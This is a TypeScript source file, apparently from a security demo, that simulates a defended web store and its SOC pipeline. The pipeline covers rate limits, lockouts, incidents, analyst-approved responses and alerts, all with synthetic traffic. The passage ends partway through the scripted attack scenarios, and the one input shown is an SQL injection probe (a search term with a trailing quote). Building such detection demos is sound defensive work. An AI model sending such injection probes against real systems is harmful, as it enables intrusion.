// GASHA demo simulation engine.
//
// A deterministic, in-browser model of the defended sandbox store and the SOC pipeline:
//   request -> rule inspection -> policy decision (allow / flag / 429 / 423) -> incident lifecycle
//   -> automated + analyst-approved response -> risk recalculation -> alert dispatch.
// All traffic is synthetic. Nothing here performs network I/O.

import type { AttackPath, Detection, ResponseAction, RiskSnapshot, StoryEvent } from '@/types/domain';
import type {
  Finding,
  FindingCategory,
  LifecycleStage,
  LifecycleStep,
  MetricsBucket,
  Mitigation,
  SocSeverity,
} from '@/types/soc';
import { BASE_PATHS, PRODUCTS, type Product } from './seed';
import { inspect, SEVERITY_RANK, type RawFinding } from './rules';

// ------------------------------------------------------------------ policy
export const POLICY = {
  limit: 40,
  windowSeconds: 30,
  escalationCount: 25, // blocked requests while throttled before escalating to a lock
  lockDurationSeconds: 300,
  authFailureLimit: 5,
  authFailureWindowSeconds: 60,
  alertCooldownSeconds: 120,
};

export const VISITOR_IP = '198.51.100.77';
export const ALERT_RECIPIENT = 'soc-oncall@gasha.market';

// ------------------------------------------------------------------ types
export type ScenarioId = 'sqli' | 'credential-stuffing' | 'scraper' | 'path-traversal' | 'xss';
export type Action = 'ALLOW' | 'FLAG' | 'THROTTLE' | 'LOCK';

export interface RequestLog {
  id: string;
  ts: string;
  ip: string;
  country: string;
  method: string;
  path: string;
  status: number;
  latencyMs: number;
  action: Action;
  ruleId?: string;
  visitor?: boolean;
}

export interface AlertRecord {
  id: string;
  ts: string;
  channel: 'email';
  to: string;
  subject: string;
  severity: SocSeverity;
  incidentId: string;
  status: 'delivered';
}

export interface SimIncident {
  id: string;
  sourceKey: string;
  country: string;
  category: FindingCategory;
  title: string;
  severity: SocSeverity;
  status: 'OPEN' | 'MITIGATED' | 'RESOLVED';
  stage: LifecycleStage;
  steps: LifecycleStep[];
  findingIds: string[];
  detectionIds: string[];
  mitigation?: Mitigation | null;
  blockedRequests: number;
  openedAt: string;
  updatedAt: string;
  resolvedAt?: string | null;
  pathId?: string;
  nodeIds: string[];
  story: StoryEvent[];
  riskBefore: number;
  riskAfter?: number;
  confidence: number;
  contained?: boolean;
}

export interface SimState {
  v: 2;
  now: number;
  autopilot: boolean;
  traffic: boolean;
  requests: RequestLog[];
  series: MetricsBucket[];
  findings: Finding[];
  incidents: SimIncident[];
  mitigations: Mitigation[];
  responses: ResponseAction[];
  detections: Detection[];
  alerts: AlertRecord[];
  risk: RiskSnapshot[];
  paths: AttackPath[];
  rate: Record<string, number[]>;
  authFails: Record<string, number[]>;
  throttledHits: Record<string, number>;
  alertCooldown: Record<string, number>;
  lastRiskAt: number;
  activeScenario: { id: ScenarioId; until: number } | null;
}

export interface SimRequest {
  ip: string;
  country: string;
  method: string;
  path: string;
  query?: Record<string, string>;
  body?: Record<string, string>;
  okStatus?: number;
  authFailed?: boolean;
  visitor?: boolean;
}

export interface SimResult {
  status: number;
  action: Action;
  ruleId?: string;
  retryAfter?: number;
  incidentId?: string;
  category?: FindingCategory;
}

// ------------------------------------------------------------------ helpers
const iso = (ms: number) => new Date(ms).toISOString();
const rid = (p: string) => `${p}-${Math.random().toString(36).slice(2, 8)}`;
const pick = <T,>(a: T[]) => a[Math.floor(Math.random() * a.length)];
const lower = (s: SocSeverity) => s.toLowerCase() as Detection['severity'];

const CATEGORY_META: Record<
  FindingCategory,
  {
    title: string;
    pathId?: string;
    nodes: string[];
    detectNode: string;
    technique: string;
    ruleName: string;
    storyKind: StoryEvent['kind'];
    confidence: number;
    containment: (ip: string) => Omit<ResponseAction, 'id' | 'incidentId' | 'state'>;
  }
> = {
  SQL_INJECTION: {
    title: 'SQL injection against product search',
    pathId: 'path-1',
    nodes: ['edge-lb', 'web-app', 'api-gate', 'pg-main'],
    detectNode: 'api-gate',
    technique: 'T1190',
    ruleName: 'SQL injection signature',
    storyKind: 'execution',
    confidence: 0.94,
    containment: () => ({
      kind: 'disable-route',
      target: '/api/search (legacy query builder)',
      requiresApproval: true,
      blastRadius: { nodeIds: ['api-gate'], servicesAffected: ['Product search'], estimatedDowntime: 'search degraded ~5 min' },
      riskReduction: 22,
    }),
  },
  BRUTE_FORCE_AUTH: {
    title: 'Credential stuffing on customer login',
    pathId: 'path-3',
    nodes: ['edge-lb', 'api-gate', 'auth-svc'],
    detectNode: 'auth-svc',
    technique: 'T1110.004',
    ruleName: 'Authentication failure threshold',
    storyKind: 'initial-access',
    confidence: 0.9,
    containment: () => ({
      kind: 'revoke-credential',
      target: 'sessions of targeted accounts',
      requiresApproval: true,
      blastRadius: { nodeIds: ['auth-svc'], servicesAffected: ['Login (forced re-authentication)'], estimatedDowntime: 'none' },
      riskReduction: 16,
    }),
  },
  RATE_LIMIT_EXCEEDED: {
    title: 'Catalog scraping burst',
    nodes: ['edge-lb', 'web-app'],
    detectNode: 'edge-lb',
    technique: 'T1595',
    ruleName: 'Per-source rate limit',
    storyKind: 'impact',
    confidence: 0.97,
    containment: (ip) => ({
      kind: 'block-ip',
      target: `${ip.split('.').slice(0, 3).join('.')}.0/24`,
      requiresApproval: true,
      blastRadius: { nodeIds: ['edge-lb'], servicesAffected: [], estimatedDowntime: 'none' },
      riskReduction: 6,
    }),
  },
  PATH_TRAVERSAL: {
    title: 'Path traversal on invoice download',
    pathId: 'path-4',
    nodes: ['edge-lb', 'web-app', 'api-gate', 's3-assets'],
    detectNode: 'api-gate',
    technique: 'T1083',
    ruleName: 'Path traversal signature',
    storyKind: 'collection',
    confidence: 0.92,
    containment: () => ({
      kind: 'disable-route',
      target: '/api/files',
      requiresApproval: true,
      blastRadius: { nodeIds: ['api-gate', 's3-assets'], servicesAffected: ['Invoice download'], estimatedDowntime: '~10 min' },
      riskReduction: 14,
    }),
  },
  XSS_PROBE: {
    title: 'Reflected XSS probe in search',
    nodes: ['web-app'],
    detectNode: 'web-app',
    technique: 'T1059.007',
    ruleName: 'Script injection signature',
    storyKind: 'execution',
    confidence: 0.8,
    containment: (ip) => ({
      kind: 'block-ip',
      target: ip,
      requiresApproval: true,
      blastRadius: { nodeIds: ['edge-lb'], servicesAffected: [], estimatedDowntime: 'none' },
      riskReduction: 4,
    }),
  },
  MALFORMED_PAYLOAD: {
    title: 'Malformed payload',
    nodes: ['api-gate'],
    detectNode: 'api-gate',
    technique: 'T1499',
    ruleName: 'Payload validation',
    storyKind: 'execution',
    confidence: 0.7,
    containment: (ip) => ({ kind: 'block-ip', target: ip, requiresApproval: true, blastRadius: { nodeIds: ['edge-lb'], servicesAffected: [] }, riskReduction: 2 }),
  },
  OVERSIZED_PAYLOAD: {
    title: 'Oversized payload',
    nodes: ['edge-lb'],
    detectNode: 'edge-lb',
    technique: 'T1499',
    ruleName: 'Body size limit',
    storyKind: 'impact',
    confidence: 0.7,
    containment: (ip) => ({ kind: 'block-ip', target: ip, requiresApproval: true, blastRadius: { nodeIds: ['edge-lb'], servicesAffected: [] }, riskReduction: 2 }),
  },
};

const BENIGN: { ip: string; country: string }[] = [
  { ip: '102.218.44.10', country: 'ET' },
  { ip: '102.218.44.37', country: 'ET' },
  { ip: '41.223.12.8', country: 'KE' },
  { ip: '197.156.70.21', country: 'ET' },
  { ip: '154.73.30.5', country: 'NG' },
  { ip: '81.2.69.142', country: 'GB' },
  { ip: '93.184.2.77', country: 'US' },
  { ip: '45.12.88.19', country: 'DE' },
  { ip: '103.21.244.9', country: 'IN' },
  { ip: '62.210.18.40', country: 'FR' },
  { ip: '196.188.120.4', country: 'ET' },
  { ip: '105.112.33.61', country: 'NG' },
];

const BENIGN_ROUTES: { method: string; path: string; status: number; weight: number }[] = [
  { method: 'GET', path: '/', status: 200, weight: 6 },
  { method: 'GET', path: '/api/products', status: 200, weight: 8 },
  { method: 'GET', path: '/api/products/p-10%', status: 200, weight: 6 },
  { method: 'GET', path: '/api/search', status: 200, weight: 4 },
  { method: 'POST', path: '/api/cart', status: 201, weight: 3 },
  { method: 'GET', path: '/api/cart', status: 200, weight: 3 },
  { method: 'POST', path: '/api/login', status: 200, weight: 2 },
  { method: 'GET', path: '/static/app.js', status: 304, weight: 4 },
  { method: 'GET', path: '/favicon.ico', status: 404, weight: 1 },
];
const ROUTE_POOL = BENIGN_ROUTES.flatMap((r) => Array(r.weight).fill(r)) as typeof BENIGN_ROUTES;
const SEARCH_TERMS = ['headphones', 'keyboard', 'power bank', 'watch', 'lamp', 'webcam', 'speaker', 'mouse'];

// ------------------------------------------------------------------ engine
export class Engine {
  S: SimState;
  private latBuf = new Map<number, number[]>();
  private timers: ReturnType<typeof setTimeout>[] = [];
  private nextAutopilotAt = 0;
  onChange: () => void = () => {};

  constructor(state?: SimState) {
    this.S = state ?? Engine.seed();
    this.nextAutopilotAt = Date.now() + 25_000;
  }

  // ---------------------------------------------------------------- seeding
  static empty(now: number): SimState {
    return {
      v: 2, now, autopilot: true, traffic: true, requests: [], series: [], findings: [], incidents: [], mitigations: [],
      responses: [], detections: [], alerts: [], risk: [], paths: BASE_PATHS.map((p) => ({ ...p })), rate: {},
      authFails: {}, throttledHits: {}, alertCooldown: {}, lastRiskAt: 0, activeScenario: null,
    };
  }

  /** Builds 10 minutes of history: steady traffic, a resolved scraping incident, an active credential-stuffing lock and an XSS probe awaiting review. */
  static seed(): SimState {
    const end = Date.now();
    const start = end - 600_000;
    const e = new Engine(Engine.empty(start));
    const plan: { at: number; req: SimRequest }[] = [
      ...scenarioPlan('scraper').map((s) => ({ at: end - 560_000 + s.at, req: s.req })),
      ...scenarioPlan('credential-stuffing').map((s) => ({ at: end - 170_000 + s.at, req: s.req })),
      ...scenarioPlan('xss').map((s) => ({ at: end - 75_000 + s.at, req: s.req })),
    ].sort((a, b) => a.at - b.at);
    let i = 0;
    for (let t = start; t <= end; t += 1000) {
      while (i < plan.length && plan[i].at <= t) {
        e.process(plan[i].req, plan[i].at);
        i++;
      }
      e.tick(t);
    }
    e.S.alerts.forEach((a) => (a.status = 'delivered'));
    return e.S;
  }

  /** Fill a gap (e.g. after a reload) with benign traffic so charts never show holes. */
  catchUp(until = Date.now()) {
    this.tick(until);
  }

  // ---------------------------------------------------------------- metrics
  private bucket(ms: number): MetricsBucket {
    const sec = Math.floor(ms / 1000) * 1000;
    const ts = iso(sec);
    const last = this.S.series[this.S.series.length - 1];
    if (last && last.ts === ts) return last;
    if (last && new Date(last.ts).getTime() > sec) {
      return this.S.series.find((b) => b.ts === ts) ?? last;
    }
    const b: MetricsBucket = { ts, total: 0, allowed: 0, flagged: 0, throttled: 0, locked: 0, rejected: 0, peakSourceRate: 0 };
    this.S.series.push(b);
    if (this.S.series.length > 300) this.S.series.splice(0, this.S.series.length - 300);
    for (const k of this.latBuf.keys()) if (k < sec - 5000) this.latBuf.delete(k);
    return b;
  }

  private record(now: number, log: Omit<RequestLog, 'id' | 'ts'>, rate: number) {
    const b = this.bucket(now);
    b.total += 1;
    if (log.action === 'ALLOW') b.allowed += 1;
    else if (log.action === 'FLAG') b.flagged += 1;
    else if (log.action === 'THROTTLE') b.throttled += 1;
    else b.locked += 1;
    b.peakSourceRate = Math.max(b.peakSourceRate, rate);
    if (log.action === 'ALLOW' || log.action === 'FLAG') {
      const sec = Math.floor(now / 1000) * 1000;
      const buf = this.latBuf.get(sec) ?? [];
      buf.push(log.latencyMs);
      this.latBuf.set(sec, buf);
      const sorted = [...buf].sort((a, b) => a - b);
      b.latencyP50 = sorted[Math.floor(sorted.length * 0.5)];
      b.latencyP95 = sorted[Math.min(sorted.length - 1, Math.floor(sorted.length * 0.95))];
    }
    this.S.requests.unshift({ id: rid('req'), ts: iso(now), ...log });
    if (this.S.requests.length > 200) this.S.requests.length = 200;
  }

  // ---------------------------------------------------------------- incidents
  private openIncident(ip: string) {
    return this.S.incidents.find((i) => i.sourceKey === ip && i.status !== 'RESOLVED');
  }

  private step(inc: SimIncident, stage: LifecycleStage, now: number, detail: string) {
    inc.steps.push({ stage, at: iso(now), detail });
    const order: LifecycleStage[] = ['INGESTED', 'DETECTED', 'ENFORCED', 'MITIGATED'];
    if (order.indexOf(stage) > order.indexOf(inc.stage)) inc.stage = stage;
    inc.updatedAt = iso(now);
  }

  private story(inc: SimIncident, now: number, kind: StoryEvent['kind'], nodeId: string, technique: string, narrative: string, evidenceIds: string[] = []) {
    inc.story.push({ id: rid('se'), ts: iso(now), kind, nodeId, technique, narrative, evidenceIds, inferred: false });
  }

  private ensureIncident(req: SimRequest, cat: FindingCategory, sev: SocSeverity, now: number) {
    const existing = this.openIncident(req.ip);
    if (existing) {
      if (SEVERITY_RANK[sev] > SEVERITY_RANK[existing.severity]) existing.severity = sev;
      return existing;
    }
    const meta = CATEGORY_META[cat];
    const inc: SimIncident = {
      id: rid('inc'), sourceKey: req.ip, country: req.country, category: cat, title: meta.title, severity: sev,
      status: 'OPEN', stage: 'INGESTED', steps: [], findingIds: [], detectionIds: [], blockedRequests: 0,
      openedAt: iso(now), updatedAt: iso(now), pathId: meta.pathId, nodeIds: meta.nodes, story: [],
      riskBefore: this.riskScore(), confidence: meta.confidence,
    };
    this.step(inc, 'INGESTED', now, `${req.method} ${req.path} from ${req.ip} (${req.country})`);
    this.story(inc, now, 'initial-access', 'edge-lb', meta.technique, `Source ${req.ip} (${req.country}) reaches ${req.method} ${req.path} on the GASHA Market edge.`);
    this.S.incidents.unshift(inc);
    if (this.S.incidents.length > 60) this.S.incidents.length = 60;
    const path = this.S.paths.find((p) => p.id === meta.pathId);
    if (path) path.status = 'open';
    return inc;
  }

  private detect(inc: SimIncident, f: Finding, now: number) {
    const meta = CATEGORY_META[f.category];
    inc.findingIds.push(f.id);
    this.step(inc, 'DETECTED', now, `${f.ruleId}: ${f.category} in ${f.location}${f.field ? ` (${f.field})` : ''}`);
    const det: Detection = {
      id: rid('det'), ts: iso(now), nodeId: meta.detectNode, rule: `${meta.ruleName} (${f.ruleId})`, severity: lower(f.severity),
      technique: meta.technique, confidence: meta.confidence,
      summary: f.evidence ? `${f.method} ${f.path} — ${f.location}${f.field ? `.${f.field}` : ''}: “${f.evidence}”` : f.diagnostic,
    };
    this.S.detections.unshift(det);
    if (this.S.detections.length > 120) this.S.detections.length = 120;
    inc.detectionIds.push(det.id);
    this.story(inc, now, meta.storyKind, meta.detectNode, meta.technique,
      `${meta.ruleName} matched${f.field ? ` in ${f.location} field “${f.field}”` : ''}. ${f.diagnostic.split('.')[0]}.`, [det.id]);
    if (!this.S.responses.some((r) => r.incidentId === inc.id && r.requiresApproval)) {
      this.S.responses.unshift({ id: rid('ra'), incidentId: inc.id, state: 'proposed', ...meta.containment(inc.sourceKey) });
    }
  }

  private enforce(inc: SimIncident, m: Mitigation, now: number) {
    this.S.mitigations = this.S.mitigations.filter((x) => x.sourceKey !== m.sourceKey).concat(m);
    inc.mitigation = m;
    if (SEVERITY_RANK[m.severity] > SEVERITY_RANK[inc.severity]) inc.severity = m.severity;
    const code = m.action === 'LOCK' ? 423 : 429;
    this.step(inc, 'ENFORCED', now, `${m.action} (HTTP ${code}) via ${m.ruleId}: ${m.reason}`);
    this.story(inc, now, 'response', 'edge-lb', 'M1037',
      `GASHA ${m.action === 'LOCK' ? 'locked' : 'throttled'} ${m.sourceKey} — HTTP ${code} until ${new Date(m.expiresAt).toLocaleTimeString()}.`);
    if (m.action === 'LOCK') {
      this.S.responses.unshift({
        id: rid('ra'), incidentId: inc.id, kind: 'block-ip', target: m.sourceKey, requiresApproval: false, state: 'done',
        blastRadius: { nodeIds: ['edge-lb'], servicesAffected: [], estimatedDowntime: 'none' }, riskReduction: 5,
      });
    }
    this.block(inc, now);
    this.dispatchAlert(inc, m, now);
  }

  private block(inc: SimIncident, now: number) {
    inc.blockedRequests += 1;
    if (inc.stage !== 'MITIGATED') {
      inc.status = 'MITIGATED';
      this.step(inc, 'MITIGATED', now, 'Policy actively rejecting traffic from source');
    } else inc.updatedAt = iso(now);
  }

  private dispatchAlert(inc: SimIncident, m: Mitigation, now: number) {
    if (SEVERITY_RANK[m.severity] < SEVERITY_RANK.HIGH) return;
    const key = `${m.sourceKey}|${m.ruleId}`;
    if (now - (this.S.alertCooldown[key] ?? 0) < POLICY.alertCooldownSeconds * 1000) return;
    this.S.alertCooldown[key] = now;
    this.S.alerts.unshift({
      id: rid('alr'), ts: iso(now), channel: 'email', to: ALERT_RECIPIENT, severity: m.severity, incidentId: inc.id, status: 'delivered',
      subject: `[GASHA ${m.severity}] ${m.action} ${m.sourceKey} — ${inc.title}`,
    });
    if (this.S.alerts.length > 50) this.S.alerts.length = 50;
  }

  private resolve(ip: string, now: number, why: string) {
    const inc = this.openIncident(ip);
    if (!inc) return;
    inc.status = 'RESOLVED';
    inc.resolvedAt = inc.updatedAt = iso(now);
    inc.steps.push({ stage: inc.stage, at: iso(now), detail: `Resolved: ${why}` });
    this.story(inc, now, 'response', 'edge-lb', 'M1037', `Incident resolved: ${why}.`);
    inc.riskAfter = this.riskScore();
  }

  private mitigation(ip: string, action: 'THROTTLE' | 'LOCK', ruleId: string, reason: string, sev: SocSeverity, secs: number, now: number): Mitigation {
    return { sourceKey: ip, action, ruleId, reason, severity: sev, createdAt: iso(now), expiresAt: iso(now + secs * 1000), blockedRequests: 1 };
  }

  private finding(raw: RawFinding, req: SimRequest, now: number): Finding {
    const query = req.query ? '?' + new URLSearchParams(req.query).toString() : '';
    return {
      id: rid('fnd'), ts: iso(now), sourceKey: req.ip, method: req.method, path: req.path + query, category: raw.category,
      ruleId: raw.ruleId, severity: raw.severity, location: raw.location, field: raw.field, evidence: raw.evidence, diagnostic: raw.diagnostic,
    };
  }

  private addFindings(inc: SimIncident, fs: Finding[], now: number) {
    for (const f of fs) {
      f.incidentId = inc.id;
      this.S.findings.unshift(f);
      this.detect(inc, f, now);
    }
    if (this.S.findings.length > 200) this.S.findings.length = 200;
  }

  // ---------------------------------------------------------------- pipeline
  process(req: SimRequest, now = Date.now()): SimResult {
    const latency = Math.round(35 + Math.random() ** 2 * 160 + (this.S.activeScenario ? 25 : 0));
    const base = { ip: req.ip, country: req.country, method: req.method, path: req.path + (req.query ? '?' + new URLSearchParams(req.query) : ''), visitor: req.visitor };
    const existing = this.S.mitigations.find((m) => m.sourceKey === req.ip && new Date(m.expiresAt).getTime() > now);

    // 1. Active lock rejects everything.
    if (existing?.action === 'LOCK') {
      existing.blockedRequests += 1;
      const inc = this.openIncident(req.ip);
      if (inc) this.block(inc, now);
      const retry = Math.ceil((new Date(existing.expiresAt).getTime() - now) / 1000);
      this.record(now, { ...base, status: 423, latencyMs: 3, action: 'LOCK', ruleId: existing.ruleId }, 0);
      return { status: 423, action: 'LOCK', ruleId: existing.ruleId, retryAfter: retry, incidentId: inc?.id };
    }

    const win = (this.S.rate[req.ip] ?? []).filter((t) => t > now - POLICY.windowSeconds * 1000);
    win.push(now);
    this.S.rate[req.ip] = win;
    const count = win.length;

    const raws = inspect(req.path, req.query, req.body);
    const findings = raws.map((r) => this.finding(r, req, now));
    const worst = findings.reduce<Finding | null>((w, f) => (!w || SEVERITY_RANK[f.severity] > SEVERITY_RANK[w.severity] ? f : w), null);

    const lock = (cat: FindingCategory, ruleId: string, reason: string, sev: SocSeverity, extra: Finding[]) => {
      const inc = this.ensureIncident(req, cat, sev, now);
      this.addFindings(inc, extra, now);
      const m = this.mitigation(req.ip, 'LOCK', ruleId, reason, sev, POLICY.lockDurationSeconds, now);
      this.enforce(inc, m, now);
      delete this.S.throttledHits[req.ip];
      this.record(now, { ...base, status: 423, latencyMs: 4, action: 'LOCK', ruleId }, count);
      return { status: 423, action: 'LOCK' as const, ruleId, retryAfter: POLICY.lockDurationSeconds, incidentId: inc.id, category: cat };
    };

    // 2. High-severity content -> lock.
    if (worst && SEVERITY_RANK[worst.severity] >= SEVERITY_RANK.HIGH) {
      return lock(worst.category, worst.ruleId, `${CATEGORY_META[worst.category].ruleName} matched`, worst.severity, findings);
    }

    // 3. Authentication failure threshold -> lock.
    if (req.authFailed) {
      const fails = (this.S.authFails[req.ip] ?? []).filter((t) => t > now - POLICY.authFailureWindowSeconds * 1000);
      fails.push(now);
      this.S.authFails[req.ip] = fails;
      if (fails.length >= POLICY.authFailureLimit) {
        const f: Finding = {
          id: rid('fnd'), ts: iso(now), sourceKey: req.ip, method: req.method, path: req.path, category: 'BRUTE_FORCE_AUTH',
          ruleId: 'RULE-AUTH-001', severity: 'HIGH', location: 'body', field: 'password',
          evidence: `${fails.length} failed logins in ${POLICY.authFailureWindowSeconds}s`,
          diagnostic: `${fails.length} authentication failures from one source within ${POLICY.authFailureWindowSeconds}s.`,
        };
        delete this.S.authFails[req.ip];
        return lock('BRUTE_FORCE_AUTH', 'RULE-AUTH-001', `${fails.length} failed logins in ${POLICY.authFailureWindowSeconds}s`, 'HIGH', [f]);
      }
    }

    // 4. Rate limit -> throttle, persistent abuse -> lock.
    if (count > POLICY.limit) {
      const retry = Math.max(1, Math.ceil((win[win.length - POLICY.limit] + POLICY.windowSeconds * 1000 - now) / 1000));
      if (existing?.action === 'THROTTLE') {
        existing.blockedRequests += 1;
        existing.expiresAt = iso(now + retry * 1000);
        const hits = (this.S.throttledHits[req.ip] ?? 0) + 1;
        this.S.throttledHits[req.ip] = hits;
        const inc = this.openIncident(req.ip);
        if (hits >= POLICY.escalationCount) {
          return lock('RATE_LIMIT_EXCEEDED', 'RULE-RATE-002', `Kept sending ${hits} requests while throttled`, 'HIGH', []);
        }
        if (inc) this.block(inc, now);
        this.record(now, { ...base, status: 429, latencyMs: 3, action: 'THROTTLE', ruleId: existing.ruleId }, count);
        return { status: 429, action: 'THROTTLE', ruleId: existing.ruleId, retryAfter: retry, incidentId: inc?.id };
      }
      const reason = `${count} requests in ${POLICY.windowSeconds}s exceeds limit of ${POLICY.limit}`;
      const inc = this.ensureIncident(req, 'RATE_LIMIT_EXCEEDED', 'MEDIUM', now);
      this.addFindings(inc, [{
        id: rid('fnd'), ts: iso(now), sourceKey: req.ip, method: req.method, path: base.path, category: 'RATE_LIMIT_EXCEEDED',
        ruleId: 'RULE-RATE-001', severity: 'MEDIUM', location: 'path', diagnostic: `${reason}.`,
      }], now);
      this.enforce(inc, this.mitigation(req.ip, 'THROTTLE', 'RULE-RATE-001', reason, 'MEDIUM', retry, now), now);
      this.S.throttledHits[req.ip] = 0;
      this.record(now, { ...base, status: 429, latencyMs: 3, action: 'THROTTLE', ruleId: 'RULE-RATE-001' }, count);
      return { status: 429, action: 'THROTTLE', ruleId: 'RULE-RATE-001', retryAfter: retry, incidentId: inc.id, category: 'RATE_LIMIT_EXCEEDED' };
    }

    // 5. Lower-severity content -> flag, allow.
    if (worst) {
      const inc = this.ensureIncident(req, worst.category, worst.severity, now);
      this.addFindings(inc, findings, now);
      this.record(now, { ...base, status: req.okStatus ?? 200, latencyMs: latency, action: 'FLAG', ruleId: worst.ruleId }, count);
      return { status: req.okStatus ?? 200, action: 'FLAG', ruleId: worst.ruleId, incidentId: inc.id, category: worst.category };
    }

    const status = req.authFailed ? 401 : req.okStatus ?? 200;
    this.record(now, { ...base, status, latencyMs: latency, action: 'ALLOW' }, count);
    return { status, action: 'ALLOW' };
  }

  // ---------------------------------------------------------------- analyst actions
  approve(id: string, now = Date.now()) {
    const ra = this.S.responses.find((r) => r.id === id);
    if (!ra || ra.state !== 'proposed') return null;
    ra.state = 'done';
    const inc = this.S.incidents.find((i) => i.id === ra.incidentId);
    if (inc) {
      inc.contained = true;
      this.story(inc, now, 'response', ra.blastRadius.nodeIds[0] ?? 'edge-lb', 'M1037', `Analyst approved ${ra.kind} → ${ra.target}.`);
      const path = this.S.paths.find((p) => p.id === inc.pathId);
      if (path) path.status = 'mitigated';
      if (inc.status !== 'RESOLVED') {
        inc.status = 'RESOLVED';
        inc.resolvedAt = inc.updatedAt = iso(now);
        inc.steps.push({ stage: inc.stage, at: iso(now), detail: `Resolved: analyst approved ${ra.kind}` });
      }
      inc.riskAfter = this.riskScore();
    }
    return ra;
  }

  reject(id: string) {
    const ra = this.S.responses.find((r) => r.id === id);
    if (ra && ra.state === 'proposed') ra.state = 'rejected';
    return ra ?? null;
  }

  release(ip: string, now = Date.now()) {
    const m = this.S.mitigations.find((x) => x.sourceKey === ip);
    if (!m) return null;
    this.S.mitigations = this.S.mitigations.filter((x) => x.sourceKey !== ip);
    delete this.S.rate[ip];
    delete this.S.throttledHits[ip];
    this.resolve(ip, now, 'released by analyst');
    return m;
  }

  // ---------------------------------------------------------------- risk
  riskScore(): number {
    const W: Record<SocSeverity, number> = { CRITICAL: 26, HIGH: 18, MEDIUM: 8, LOW: 3 };
    let r = 26 + this.S.paths.filter((p) => p.status === 'open').length * 4;
    for (const i of this.S.incidents) {
      if (i.status === 'OPEN') r += W[i.severity];
      else if (i.status === 'MITIGATED') r += W[i.severity] / 2;
    }
    return Math.round(Math.max(12, Math.min(96, r)));
  }

  // ---------------------------------------------------------------- clock
  /** Advances the clock, backfilling any skipped seconds (background tabs tick irregularly). */
  tick(now = Date.now()) {
    const from = Math.max(this.S.now + 1000, now - 300_000);
    for (let t = from; t < now; t += 1000) this.advance(t);
    this.advance(now);
  }

  private advance(now: number) {
    this.S.now = now;
    for (const m of [...this.S.mitigations]) {
      if (new Date(m.expiresAt).getTime() <= now) {
        this.S.mitigations = this.S.mitigations.filter((x) => x !== m);
        delete this.S.throttledHits[m.sourceKey];
        this.resolve(m.sourceKey, now, `${m.action.toLowerCase()} window elapsed`);
      }
    }
    for (const inc of this.S.incidents) {
      if (inc.status === 'OPEN' && !inc.mitigation && now - new Date(inc.updatedAt).getTime() > 15 * 60_000) {
        this.resolve(inc.sourceKey, now, 'no further activity');
      }
    }
    if (this.S.activeScenario && now > this.S.activeScenario.until) this.S.activeScenario = null;

    if (this.S.traffic) {
      const n = 3 + Math.floor(Math.random() * 6);
      for (let k = 0; k < n; k++) {
        const src = pick(BENIGN);
        const r = pick(ROUTE_POOL);
        const path = r.path.replace('%', String(1 + Math.floor(Math.random() * 8)));
        this.process(
          { ip: src.ip, country: src.country, method: r.method, path, okStatus: r.status, query: r.path === '/api/search' ? { q: pick(SEARCH_TERMS) } : undefined },
          now - Math.floor(Math.random() * 900),
        );
      }
    } else this.bucket(now);

    if (now - this.S.lastRiskAt >= 10_000) {
      this.S.lastRiskAt = now;
      this.S.risk.push({
        ts: iso(now), score: this.riskScore(), openPaths: this.S.paths.filter((p) => p.status === 'open').length,
        openIncidents: this.S.incidents.filter((i) => i.status !== 'RESOLVED').length,
      });
      if (this.S.risk.length > 60) this.S.risk.splice(0, this.S.risk.length - 60);
    }

    for (const [ip, w] of Object.entries(this.S.rate)) {
      const keep = w.filter((t) => t > now - POLICY.windowSeconds * 1000);
      if (keep.length) this.S.rate[ip] = keep;
      else delete this.S.rate[ip];
    }

    if (this.S.autopilot && !this.S.activeScenario && now >= this.nextAutopilotAt && typeof window !== 'undefined') {
      this.nextAutopilotAt = now + 45_000;
      this.runScenario(pick<ScenarioId>(['sqli', 'scraper', 'credential-stuffing', 'path-traversal', 'xss']));
    }
  }

  // ---------------------------------------------------------------- scenarios (live)
  runScenario(id: ScenarioId) {
    const plan = scenarioPlan(id);
    const start = Date.now();
    this.S.activeScenario = { id, until: start + plan[plan.length - 1].at + 1500 };
    this.nextAutopilotAt = Math.max(this.nextAutopilotAt, start + 45_000);
    for (const s of plan) {
      this.timers.push(setTimeout(() => {
        this.process(s.req);
        this.onChange();
      }, s.at));
    }
    this.onChange();
  }

  stop() {
    this.timers.forEach(clearTimeout);
    this.timers = [];
  }

  // ---------------------------------------------------------------- sandbox store
  storeRequest(kind: 'search' | 'login' | 'product' | 'cart', args: Record<string, string>): SimResult & { products?: Product[] } {
    const v = { ip: VISITOR_IP, country: 'Sandbox visitor', visitor: true };
    if (kind === 'search') {
      const r = this.process({ ...v, method: 'GET', path: '/api/search', query: { q: args.q ?? '' } });
      const q = (args.q ?? '').toLowerCase().trim();
      const products = r.status < 400 ? PRODUCTS.filter((p) => !q || p.name.toLowerCase().includes(q)) : undefined;
      return { ...r, products };
    }
    if (kind === 'login') {
      const ok = args.email === 'shopper@gasha.market' && args.password === 'shop123';
      return this.process({ ...v, method: 'POST', path: '/api/login', body: { email: args.email ?? '', password: args.password ?? '' }, authFailed: !ok });
    }
    if (kind === 'product') return this.process({ ...v, method: 'GET', path: `/api/products/${args.id}` });
    return this.process({ ...v, method: 'POST', path: '/api/cart', body: { productId: args.id ?? '' }, okStatus: 201 });
  }
}

// ------------------------------------------------------------------ scenario scripts
const ATTACKERS: Record<ScenarioId, { ip: string; country: string }> = {
  sqli: { ip: '185.220.101.34', country: 'NL' },
  'credential-stuffing': { ip: '45.155.205.77', country: 'RU' },
  scraper: { ip: '23.94.144.140', country: 'US' },
  'path-traversal': { ip: '103.152.18.23', country: 'VN' },
  xss: { ip: '91.240.118.55', country: 'UA' },
};

export const SCENARIOS: { id: ScenarioId; label: string; expect: string }[] = [
  { id: 'sqli', label: 'SQL injection', expect: 'CRITICAL · HTTP 423 lock' },
  { id: 'credential-stuffing', label: 'Credential stuffing', expect: 'HIGH · lock after 5 failed logins' },
  { id: 'scraper', label: 'Scraper burst', expect: 'HTTP 429 → escalates to 423' },
  { id: 'path-traversal', label: 'Path traversal', expect: 'HIGH · HTTP 423 lock' },
  { id: 'xss', label: 'XSS probe', expect: 'MEDIUM · flagged for review' },
];

function scenarioPlan(id: ScenarioId): { at: number; req: SimRequest }[] {
  const a = ATTACKERS[id];
  const r = (method: string, path: string, extra: Partial<SimRequest> = {}): SimRequest => ({ ip: a.ip, country: a.country, method, path, ...extra });
  switch (id) {
    case 'sqli':
      return [
        { at: 0, req: r('GET', '/api/search', { query: { q: 'headphones' } }) },
        { at: 900, req: r('GET', '/api/search', { query: { q: "headphones'" } }) },
